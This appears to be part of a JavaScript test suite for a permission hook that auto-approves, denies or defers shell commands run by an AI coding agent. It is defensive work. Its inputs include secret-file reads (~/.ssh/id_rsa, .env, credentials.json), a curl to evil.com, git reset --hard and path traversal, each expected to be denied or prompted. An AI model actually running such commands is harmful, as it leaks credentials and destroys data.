// =============================================================================
// CLAUDE CLI SUBPROCESS (non-interactive -p mode)
// =============================================================================
console.log('\nClaude CLI subprocess');

testCommand('claude -p "Generate tests for Story 1"', 'allow', 'claude -p with simple prompt');
testCommand('claude --model claude-sonnet-4-6 -p "Generate tests for Epic 1, Story 1"', 'allow', 'claude --model + -p');
testCommand('claude --print "Run lint check"', 'allow', 'claude --print (long form)');
testCommand('claude --model claude-sonnet-4-6 --max-turns 5 -p "Generate tests"', 'allow', 'claude with multiple flags before -p');
testCommand('cd web && claude -p "Run tests"', 'allow', 'cd prefix + claude -p');
testCommand('CI=true claude -p "Generate tests"', 'allow', 'env prefix + claude -p');
testCommand('claude -p "Generate tests for Epic 1, Story 1 \u2014 Render the contact form with all four fields.\n\nStory file: generated-docs/stories/epic-1/story-1.md\nTest design: generated-docs/test-design/epic-1/story-1-test-design.md\n\nWrite failing tests."', 'allow', 'claude -p with multi-line prompt (newlines inside quotes)');

// Safety: interactive claude (no -p) should NOT be auto-approved
testCommand('claude', 'fallthrough', 'interactive claude = fallthrough');
testCommand('claude --model claude-sonnet-4-6', 'fallthrough', 'claude with model but no -p = fallthrough');
testCommand('claude --verbose', 'fallthrough', 'claude --verbose without -p = fallthrough');

// =============================================================================
// GREP ON BARE SAFE DIRECTORIES (recursive grep targeting a directory)
// =============================================================================
console.log('\nGrep on bare safe directories');

testCommand('grep -rn "pattern" .claude/', 'allow', 'grep -rn bare .claude/ (trailing slash)');
testCommand('grep -r "pattern" .claude', 'allow', 'grep -r bare .claude (no trailing slash)');
testCommand('grep -rn "pattern" web/', 'allow', 'grep -rn bare web/');
testCommand('grep -r "pattern" documentation/', 'allow', 'grep -r bare documentation/');
testCommand('grep -rn "pattern" generated-docs/', 'allow', 'grep -rn bare generated-docs/');
testCommand('grep -r "pattern" .github/', 'allow', 'grep -r bare .github/');
testCommand('cd "c:/AI/project" && grep -rn "getRequirementsCoverage" .claude/ 2>/dev/null | head -10', 'allow', 'cd + grep -rn .claude/ | head (reported command 1)');
testCommand('grep -rn "pattern" .claude/scripts/', 'allow', 'grep -rn .claude/scripts/ (subpath still works)');
testCommand('grep -rn "pattern" /etc/', 'fallthrough', 'grep -rn /etc/ = fallthrough (not a safe dir)');

// =============================================================================
// GREP WITH MULTIPLE PATH ARGS AND GLOBS (test-generator probe shape)
// =============================================================================
console.log('\nGrep with multiple path args and globs');

// Multiple safe-dir path arguments after the search term
testCommand('grep -rl "vitest-axe" web/src web/lib', 'allow', 'grep multi path (no glob)');
testCommand('grep -rln "x" web/src documentation generated-docs', 'allow', 'grep three safe-dir path args');
// Glob `*` / `?` in a path token
testCommand('grep -rl "vitest-axe" web/*.ts', 'allow', 'grep single path with glob');
testCommand('grep -rl "x" "web/src/*.config.?s"', 'allow', 'grep quoted path with * and ? globs');
// Multiple paths AND globs together — the exact failing segment from the reported command
testCommand('grep -rl "vitest-axe" web/src web/*.ts web/*.config.*', 'allow', 'grep multi path + glob (reported segment)');
// The full reported test-generator probe command (8 chained segments)
testCommand(
  'cd c:/Git/00-Stadium-8-test-repos/Benchmarking/stadium-benchmark-v04 && echo "===VITEST SETUP===" && ls web/src/__tests__/setup* web/vitest.setup* web/src/test* 2>/dev/null; grep -rl "vitest-axe" web/src web/*.ts web/*.config.* 2>/dev/null; echo "===tsconfig include==="; grep -A 15 \'"include"\' web/tsconfig.json 2>/dev/null; echo "===existing axe usage==="; grep -rln "toHaveNoViolations\\|vitest-axe/matchers\\|extend.*axe" web/src 2>/dev/null',
  'allow',
  'full reported test-generator vitest-axe probe command'
);
// Security guards must still hold with the broadened (multi-path/glob) grep
testCommand('grep -rl "x" web/.env', 'deny', 'multi-capable grep: .env still denied');
testCommand('grep -rl "x" web/src/.ssh/id_rsa', 'deny', 'multi-capable grep: id_rsa still denied');
testCommand('grep -rl "x" web/src /etc/passwd', 'fallthrough', 'grep where one path is outside safe dirs = fallthrough');
testCommand('grep -rl "x" ~/secrets/*.key', 'fallthrough', 'grep home-dir glob outside safe dirs = fallthrough');

// =============================================================================
// PARENTHESIZED SUBSHELL PIPED TO A FILTER (CI-verification probe shape)
// e.g. `(cd web && npx tsc --noEmit) 2>&1 | tail -5`
// =============================================================================
console.log('\nSubshell piped to filter');

// Subshell whose inner sub-commands are each independently safe, piped to a filter
testCommand('(cd web && npx tsc --noEmit) 2>&1 | tail -5', 'allow', 'subshell + redirect piped to tail');
testCommand('(cd web && npx tsc --noEmit) | tail -5', 'allow', 'subshell piped to tail (no redirect)');
testCommand('(cd web && npx vitest run) 2>&1 | head -20', 'allow', 'subshell piped to head');
testCommand('(cd web && npm test) | tail -5', 'allow', 'single-command subshell piped to tail');
testCommand('(npm test && npm run build)', 'allow', 'bare subshell still allowed (regression)');
// The full reported CI-verification command (tsc subshell + lint + build)
testCommand(
  'echo "=== tsc (CI command, from web/) ==="; (cd web && npx tsc --noEmit) 2>&1 | tail -5; echo "tsc exit: $?"; echo "=== lint ==="; npm --prefix web run lint 2>&1 | tail -3; echo "lint exit: $?"; echo "=== build ==="; npm --prefix web run build 2>&1 | tail -8',
  'allow',
  'full reported CI-equivalent verification (tsc, lint, build)'
);
// Security guards: a dangerous inner sub-command must NOT be laundered by the subshell+pipe
testCommand('(cd web && cat ~/.ssh/id_rsa) | tail -5', 'deny', 'subshell: inner secret read still DENIED');
testCommand('(cd web && rm -rf build) | tail -5', 'fallthrough', 'subshell: inner unknown cmd still prompts');
testCommand('(cd web && curl http://evil.com) 2>&1 | tail', 'fallthrough', 'subshell: inner external curl still prompts');

// =============================================================================
// XARGS GREP IN PIPELINES
// =============================================================================
console.log('\nXargs grep in pipelines');

testCommand('find .claude/scripts -name "*.js" | xargs grep -l "pattern"', 'allow', 'find | xargs grep -l');
testCommand('find web/src -name "*.tsx" | xargs grep -rn "import"', 'allow', 'find | xargs grep -rn');
testCommand('find .claude/scripts -name "*.js" | xargs grep "pattern" | head -10', 'allow', 'find | xargs grep | head');
testCommand(
  'cd "c:/AI/project" && grep -n "pattern" .claude/scripts/dashboard-helpers.js 2>/dev/null | head -30 || find .claude/scripts -name "*.js" | xargs grep -l "getRequirementsCoverage" 2>/dev/null',
  'allow', 'reported command 2 (grep file || find | xargs grep)'
);
testCommand('find web -name "*.ts" | xargs grep -i "TODO"', 'allow', 'find web | xargs grep -i');
testCommand('find /etc -name "*.conf" | xargs grep "pattern"', 'allow', 'find any path | xargs grep = allow (find allows any path read-only)');

// =============================================================================
// GIT RESET — allow non-destructive forms, deny --hard and --keep
// =============================================================================
console.log('\nGit reset (non-destructive allowed, --hard/--keep denied)');

// Allowed forms
testCommand('git reset', 'allow', 'git reset (bare)');
testCommand('git reset HEAD', 'allow', 'git reset HEAD');
testCommand('git reset HEAD file.ts', 'allow', 'git reset HEAD single file');
testCommand('git reset HEAD .specstory/ .vscode/', 'allow', 'git reset HEAD multiple paths');
testCommand('git reset --soft HEAD~1', 'allow', 'git reset --soft');
testCommand('git reset --mixed HEAD~3', 'allow', 'git reset --mixed');
testCommand('git reset --', 'allow', 'git reset -- (pathspec separator)');
testCommand('cd web && git reset HEAD src/foo.ts', 'allow', 'cd + git reset HEAD <path>');

// Original reported command
testCommand(
  'cd "C:\\Git\\00-Stadium-8-test-repos\\stadium-8-test-run-22-multi-phase" && git reset HEAD .specstory/ .vscode/ && git add .claude/logs/ generated-docs/ web/src/__tests__/integration/popia-data-deletion-link.test.tsx web/src/app/layout.tsx',
  'allow',
  'cd external-repo + git reset HEAD + git add (original reported command)'
);

// Denied forms (working-tree destructive)
testCommand('git reset --hard', 'deny', 'git reset --hard = deny');
testCommand('git reset --hard HEAD~1', 'deny', 'git reset --hard HEAD~1 = deny');
testCommand('git reset --hard origin/main', 'deny', 'git reset --hard origin/main = deny');
testCommand('git reset HEAD~1 --hard', 'deny', 'git reset HEAD~1 --hard (flag after ref) = deny');
testCommand('git reset --keep HEAD~1', 'deny', 'git reset --keep = deny');
testCommand('cd web && git reset --hard', 'deny', 'cd + git reset --hard compound = deny');
testCommand('git reset --hard && git add foo', 'deny', 'git reset --hard inside compound = deny');

// Safety: --hardcoded is NOT --hard (word boundary)
testCommand('git reset --hardcore', 'allow', '--hardcore (no word-boundary at --hard) = allow');

// =============================================================================
// BROADENED `src/` READS (safeDirsRead) — development ergonomics
// =============================================================================
console.log('\nBroadened src/ reads (safeDirsRead)');

// Bare src/ paths in the project — allow
testCommand('cat src/app/page.tsx', 'allow', 'cat bare src/ file');
testCommand('grep -n "pattern" src/lib/foo.ts', 'allow', 'grep bare src/ file');
testCommand('head -20 src/components/Button.tsx', 'allow', 'head bare src/ file');
testCommand('tail -10 src/utils.ts', 'allow', 'tail bare src/ file');
testCommand('wc -l src/index.ts', 'allow', 'wc bare src/ file');
testCommand('ls src/', 'allow', 'ls bare src/ dir');
testCommand('ls -la src/components/', 'allow', 'ls -la bare src/ subdir');
testCommand('grep -rn "pattern" src/', 'allow', 'grep -rn bare src/ (recursive)');
testCommand('grep -r "pattern" src', 'allow', 'grep -r bare src (no trailing slash)');
testCommand('mkdir -p src/components/Foo', 'allow', 'mkdir bare src/ subdir');
testCommand('diff src/old.ts src/new.ts', 'allow', 'diff two bare src/ files');

// The original reported command
testCommand(
  'cd "C:/Git/00-Stadium-8-test-repos/stadium-8-test-run-22-multi-phase/web" && grep -n "test-quality-ignore" src/__tests__/integration/app-shell-branding.test.tsx 2>/dev/null | head -5',
  'allow',
  'cd external-repo/web + grep src/__tests__/ file | head (original reported command)'
);

// cd + bare src/ paths
testCommand('cd web && cat src/app/page.tsx', 'allow', 'cd web + cat src/ file');
testCommand('cd web && grep -rn "use client" src/', 'allow', 'cd web + grep -rn src/');

// Boundary anchor: `src` must be preceded by /, \, ", ', or start-of-arg
testCommand('cat my-src/foo.ts', 'fallthrough', 'cat my-src/ (hyphen boundary) = fallthrough');
testCommand('cat mysrc/foo.ts', 'fallthrough', 'cat mysrc/ (no boundary) = fallthrough');
testCommand('cat my_src/foo.ts', 'fallthrough', 'cat my_src/ (underscore boundary) = fallthrough');
testCommand('grep "foo" x-src/bar.ts', 'fallthrough', 'grep x-src/ = fallthrough');
testCommand('cat srcfoo/bar.ts', 'fallthrough', 'cat srcfoo/ (src as prefix of dir) = fallthrough');

// =============================================================================
// SECRET FILE PROTECTION - src/ paths and always-deny
// =============================================================================
console.log('\nSecret file protection (src/ + always-deny)');

// src/ should NOT bypass existing secret denies (src is in safeDirsRead, not safeDirs for bypass)
testCommand('cat src/id_rsa', 'deny', 'cat src/id_rsa = deny (src not in bypass)');
testCommand('cat src/secrets/id_rsa', 'deny', 'cat src/secrets/id_rsa = deny');
testCommand('cat src/keys/server.pem', 'deny', 'cat src/keys/server.pem = deny');
testCommand('cat src/.ssh/config', 'deny', 'cat src/.ssh/config = deny');
testCommand('head src/credentials.json', 'deny', 'head src/credentials.json = deny');
testCommand('tail src/private_key.pem', 'deny', 'tail src/private_key.pem = deny');

// New always-deny: .env files even inside safe dirs (no bypass)
testCommand('cat web/.env', 'deny', 'cat web/.env = deny (always-deny, overrides safe-dir bypass)');
testCommand('cat web/src/.env', 'deny', 'cat web/src/.env = deny');
testCommand('cat web/.env.local', 'deny', 'cat web/.env.local = deny');
testCommand('cat .env', 'deny', 'cat .env = deny');
testCommand('cat documentation/.env.production', 'deny', 'cat documentation/.env.production = deny');
testCommand('head src/config/.env', 'deny', 'head src/config/.env = deny');

// .env deny should NOT false-positive on legitimate .env.something-as-part-of-filename
testCommand('cat web/src/config.env.ts', 'allow', 'cat config.env.ts (.env not at leaf boundary) = allow');
testCommand('cat web/src/lib/env-loader.ts', 'allow', 'cat env-loader.ts (no .env leaf) = allow');

// New always-deny: grep reading credential-like files
testCommand('grep "pattern" src/id_rsa', 'deny', 'grep src/id_rsa = deny');
testCommand('grep "foo" web/src/server.pem', 'deny', 'grep web/src/server.pem = deny');
testCommand('grep "x" src/.ssh/known_hosts', 'deny', 'grep src/.ssh/known_hosts = deny');
testCommand('grep "y" web/.env', 'deny', 'grep web/.env = deny');
testCommand('grep "z" src/.env.local', 'deny', 'grep src/.env.local = deny');
testCommand('grep -n "pat" web/src/credentials.json', 'deny', 'grep web/src/credentials.json = deny');
testCommand('grep "x" web/src/private_key.pem', 'deny', 'grep private_key.pem = deny');
testCommand('grep "x" web/src/private-key.pem', 'deny', 'grep private-key.pem = deny');

// grep-secret deny should NOT block grepping FOR a secret-like keyword in a code file
testCommand('grep "id_rsa" web/src/foo.ts', 'allow', 'grep for "id_rsa" pattern in code file = allow (keyword not final arg)');
testCommand('grep "secret" web/src/lib/auth.ts', 'allow', 'grep for "secret" pattern in code file = allow');
testCommand('grep ".env" web/src/lib/config.ts', 'allow', 'grep for ".env" pattern in code file = allow');
testCommand('grep "private_key" web/src/lib/auth.ts', 'allow', 'grep for "private_key" pattern in code file = allow');

// Always-deny inside pipelines
testCommand('cat web/.env | head -5', 'deny', 'cat web/.env inside pipeline = still deny');
testCommand('grep "x" src/id_rsa | head', 'deny', 'grep src/id_rsa inside pipeline = still deny');

// Always-deny inside compound commands
testCommand('echo ok && cat web/.env', 'deny', 'cat web/.env inside compound = still deny');
testCommand('cd web && grep "x" src/id_rsa', 'deny', 'grep src/id_rsa inside compound = still deny');

// =============================================================================
// POWERSHELL CMDLETS (direct invocation)
// =============================================================================
console.log('\nPowerShell cmdlets (New-Item, Out-Null, Write-Output)');

// User-reported compound: prototype-screenshots dir prep
testCommand(
  'New-Item -ItemType Directory -Force -Path "C:\\Git\\00-Stadium-8-test-repos\\stadium-8-test-run-24-playwright-testing\\generated-docs\\prototype-screenshots" | Out-Null; Write-Output "Directory ready"',
  'allow',
  'New-Item generated-docs subdir | Out-Null; Write-Output (user-reported)'
);

// New-Item directory creation in safe-write paths
testCommand('New-Item -ItemType Directory -Path generated-docs/foo', 'allow', 'New-Item -ItemType Directory in generated-docs');
testCommand('New-Item -ItemType Directory -Force -Path "generated-docs/foo/bar"', 'allow', 'New-Item -Force quoted forward-slash path');
testCommand('New-Item -ItemType Directory -Force -Path web/src/new-feature', 'allow', 'New-Item under web/');
testCommand('New-Item -Force -ItemType Directory -Path generated-docs/foo', 'allow', 'New-Item flag-order -Force before -ItemType');
testCommand('New-Item -ItemType Directory -Path "C:\\some\\path\\generated-docs\\foo"', 'allow', 'New-Item with absolute Windows path containing safe-dir segment');

// Out-Null and Write-Output as standalones (so the pipeline / compound segments allow)
testCommand('Out-Null', 'allow', 'Out-Null bare');
testCommand('Write-Output "hello"', 'allow', 'Write-Output with double-quoted string');
testCommand("Write-Output 'hello world'", 'allow', 'Write-Output with single-quoted string');
testCommand('Write-Output ready', 'allow', 'Write-Output with bare token');

// Safety: New-Item must NOT auto-approve outside write-safe dirs
testCommand('New-Item -ItemType Directory -Path /etc/foo', 'fallthrough', 'New-Item -Path /etc/foo = fallthrough (not write-safe)');
testCommand('New-Item -ItemType Directory -Path "C:\\Windows\\System32\\evil"', 'fallthrough', 'New-Item under System32 = fallthrough');
testCommand('New-Item -ItemType Directory -Path "documentation/foo"', 'fallthrough', 'New-Item under documentation = fallthrough (read-only safe dir)');

// Safety: New-Item creating a FILE (not Directory) is NOT auto-approved
testCommand('New-Item -ItemType File -Path generated-docs/foo.txt', 'fallthrough', 'New-Item -ItemType File = fallthrough (only Directory auto-approved)');
testCommand('New-Item -Path generated-docs/foo', 'fallthrough', 'New-Item without -ItemType Directory = fallthrough');

// Safety: path traversal in New-Item dest is rejected
testCommand('New-Item -ItemType Directory -Path "generated-docs/../etc/foo"', 'fallthrough', 'New-Item path traversal = fallthrough');

// =============================================================================
// SUMMARY
// =============================================================================
console.log('\n========================================');
console.log(`Results: ${passed} passed, ${failed} failed`);

if (errors.length > 0) {
  console.log('\nFailures:');
  for (const err of errors) {
    console.log(`  \x1b[31m${err}\x1b[0m`);
  }
}

console.log('========================================\n');
process.exit(failed === 0 ? 0 : 1);
